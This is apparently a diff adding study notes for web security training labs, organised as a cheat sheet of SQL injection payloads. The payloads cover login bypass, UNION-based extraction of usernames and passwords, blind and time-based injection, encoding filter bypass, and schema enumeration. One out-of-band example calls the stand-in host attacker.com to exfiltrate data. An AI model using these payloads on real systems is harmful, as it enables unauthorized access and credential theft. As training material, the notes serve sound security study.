@@ -1,3 +1,103 @@
+### 01 - SQL Injection
+
+- **Login Form → username parameter**
+    - **Vulnerability:** SQL Injection – Login Bypass
+        - **Description:** Bypass authentication by injecting into login fields.
+        - **Payloads:**
+            - `administrator'--`
+        - **Relevant Labs:**
+            - SQL injection vulnerability allowing login bypass
+
+- **Product Filter → category parameter**    
+    - **Vulnerability:** SQL Injection – WHERE Clause Bypass
+        - **Description:** Retrieve hidden data by breaking or appending conditions in SQL WHERE clauses.
+        - **Payloads:**
+            - `' OR '1'='1'--`
+        - **Relevant Labs:**
+            - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+- **Query Parameter → UNION-based Injection**
+    - **Vulnerability:** SQL Injection – UNION SELECT
+        - **Techniques:**
+            - Determine number of columns:
+                - `' ORDER BY 1--`
+                - `' UNION SELECT NULL,NULL--`
+            - Identify column containing text:
+                - `' UNION SELECT NULL,'abc'--`
+            - Extract data from other tables:
+                - `' UNION SELECT username, password FROM users--`
+            - Merge multiple values in one column:
+                - `' UNION SELECT NULL, username || ':' || password FROM users--`
+        - **Relevant Labs:**
+            - SQL injection UNION attack, determining the number of columns returned by the query
+            - SQL injection UNION attack, finding a column containing text
+            - SQL injection UNION attack, retrieving data from other tables
+            - SQL injection UNION attack, retrieving multiple values in a single column
+
+- **Generic Input Field**
+    - **Vulnerability:** Blind SQL Injection – Conditional Responses
+        - **Description:** Use conditions to infer data from responses (true vs. false queries).
+        - **Payloads:**
+            - `' AND 1=1--`
+            - `' AND 1=2--`
+        - **Relevant Labs:**
+            - Blind SQL injection with conditional responses
+    - **Vulnerability:** Blind SQL Injection – Error-Based
+        - **Description:** Use syntax errors to infer application logic or data presence.
+        - **Payloads:**
+            - `' || (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE '' END FROM dual)--`
+        - **Relevant Labs:**
+            - Blind SQL injection with conditional errors
+            - Visible error-based SQL injection
+    - **Vulnerability:** Blind SQL Injection – Time Delays
+        - **Description:** Use `SLEEP()` or `pg_sleep()` to detect data conditions from delayed responses.
+        - **Payloads:**
+            - `' OR IF(1=1, SLEEP(10), 0)--`
+            - `' OR pg_sleep(5)--`
+        - **Relevant Labs:**
+            - Blind SQL injection with time delays
+            - Blind SQL injection with time delays and information retrieval
+
+- **Product Filter → XML-encoded input**
+
+    - **Vulnerability:** SQL Injection – Filter Bypass via Encoding
+        - **Description:** Bypass input filters using UTF-8 or XML-encoded characters.
+        - **Payloads:**
+            - `%27` for `'`
+            - `&#x27;` for `'`
+        - **Relevant Labs:**
+            - SQL injection with filter bypass via XML encoding
+
+- **Tracking Cookie / Header Field**
+    - **Vulnerability:** SQL Injection – Out-of-Band (OOB) Interaction
+        - **Description:** Use database features to trigger DNS or HTTP requests to exfiltrate data.
+        - **Payloads:**
+            - Oracle: `SELECT extractvalue(xmltype('<!DOCTYPE ...')...)`
+            - MSSQL: `; exec xp_dirtree('//attacker.com/a')--`
+        - **Relevant Labs:**
+            - Blind SQL injection with out-of-band interaction
+            - Blind SQL injection with out-of-band data exfiltration
+
+- **Database-Specific Enumeration**
+    - **Vulnerability:** SQL Injection – DB Discovery
+        - **Description:** Query system tables to fingerprint DB type and version.
+        - **Payloads (Examples):**
+            - MySQL/MSSQL: `SELECT @@version`
+            - Oracle: `SELECT banner FROM v$version`
+        - **Relevant Labs:**
+            - SQL injection attack, querying the database type and version on MySQL and Microsoft
+            - SQL injection attack, querying the database type and version on Oracle
+
+- **Database Contents**
+    - **Vulnerability:** SQL Injection – Schema Enumeration
+        - **Description:** List databases and tables through `information_schema` or Oracle's data dictionary.
+        - **Payloads:**
+            - MySQL: `SELECT table_name FROM information_schema.tables`
+            - Oracle: `SELECT table_name FROM all_tables`
+        - **Relevant Labs:**
+            - SQL injection attack, listing the database contents on non-Oracle databases
+            - SQL injection attack, listing the database contents on Oracle
+
 ### 02 - Authentication
 
 - **Login Form → username parameter**
